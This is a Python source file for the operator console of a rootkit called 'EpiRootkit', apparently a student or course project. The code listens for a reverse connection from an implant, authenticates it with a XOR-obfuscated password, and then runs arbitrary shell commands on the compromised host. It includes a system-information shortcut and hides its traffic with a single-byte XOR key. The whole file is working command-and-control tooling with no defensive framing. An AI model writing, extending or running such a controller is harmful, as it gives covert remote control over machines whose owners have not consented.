import argparse
import socket
import logging
import sys
import time
import os
from datetime import datetime

XOR_KEY = 0x2A
EOF_MARKER = "--EOF--"
STDERR_MARKER = "--STDERR--"
STATUS_MARKER = "--STATUS--"


def xor(data: bytes) -> bytes:
    return bytes([b ^ XOR_KEY for b in data])


def format_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


class EpiRootkitClient:
    def __init__(self, host, port, password):
        self.host = host
        self.port = port
        self.password = password
        self.sock = None

    def start(self):
        logging.info("[*] Listening on %s:%d for incoming connections", self.host, self.port)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.host, self.port))
            server.listen(1)

            while True:
                conn, addr = server.accept()
                with conn:
                    logging.info("[+] Incoming connection from %s:%d", *addr)
                    self.sock = conn
                    if not self.authenticate():
                        logging.warning("[-] Authentication failed")
                        continue
                    logging.info("[+] Authentication successful")
                    self.handle_session()
                    logging.info("[*] Connection closed. Waiting for reconnection...")

    def authenticate(self):
        self.sock.sendall(xor(self.password.encode()))
        self.sock.settimeout(5.0)
        try:
            resp = self.sock.recv(1024)
            if not resp:
                return False
            return xor(resp).decode().strip() == "OK"
        except Exception:
            return False
        finally:
            self.sock.settimeout(None)

    def handle_session(self):
        cwd = "/"
        while True:
            try:
                cmd = input("epirootkit> ")
            except KeyboardInterrupt:
                logging.info("[CTRL+C] Exiting.")
                break

            if not cmd.strip():
                continue

            if cmd in ("exit", "quit"):
                self.send(cmd)
                break

            if cmd.startswith("!cd "):
                cwd = cmd[4:].strip()
                logging.info("[INFO %s] Changed remote directory to %s", format_timestamp(), cwd)
                continue

            if cmd == "!clear":
                os.system("clear")
                continue

            if cmd == "!ping":
                start = time.time()
                self.send("PING")
                try:
                    resp = xor(self.sock.recv(1024)).decode(errors='ignore')
                    latency = int((time.time() - start) * 1000)
                    logging.info("[INFO %s] Ping response: %s (%d ms)", format_timestamp(), resp.strip(), latency)
                except socket.timeout:
                    logging.warning("[WARN %s] No ping response.", format_timestamp())
                continue

            if cmd == "!sysinfo":
                cmd = "uname -a && uptime && whoami"

            if cwd != "/":
                cmd = f"cd {cwd} && {cmd}"

            self.send(cmd)
            self.receive_response(cmd)

    def send(self, cmd):
        self.sock.sendall(xor(cmd.encode()))

    def receive_response(self, cmd):
        logging.info("[INFO %s] Command: %s", format_timestamp(), cmd)
        output = b""
        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                logging.warning("Connection lost while receiving command output.")
                return
            decrypted = xor(chunk)
            output += decrypted
            if EOF_MARKER.encode() in output:
                break

        try:
            out = output.decode(errors='ignore')
        except Exception:
            logging.error("Failed to decode output")
            return

        stdout_part = out.split(STDERR_MARKER)[0] if STDERR_MARKER in out else out
        stderr_part = ""
        status_part = ""

        if STDERR_MARKER in out:
            rest = out.split(STDERR_MARKER)[1]
            stderr_part = rest.split(STATUS_MARKER)[0] if STATUS_MARKER in rest else rest

        if STATUS_MARKER in out:
            after = out.split(STATUS_MARKER)[1]
            status_part = after.split(EOF_MARKER)[0] if EOF_MARKER in after else after

        for line in stdout_part.strip().splitlines():
            print(f"[OUTPUT] {line}")
        for line in stderr_part.strip().splitlines():
            print(f"[ERROR] {line}")

        status = status_part.strip()
        if status:
            result = "Success" if status == "0" else "Failure"
            print(f"[STATUS] Exit code: {status} ({result})")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="0.0.0.0", help="Host to bind the server")
    parser.add_argument("--port", type=int, default=4242, help="Port to bind the server")
    parser.add_argument("--password", default="secret", help="Password for authentication")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format='[%(levelname)s %(asctime)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

    client = EpiRootkitClient(args.host, args.port, args.password)
    client.start()
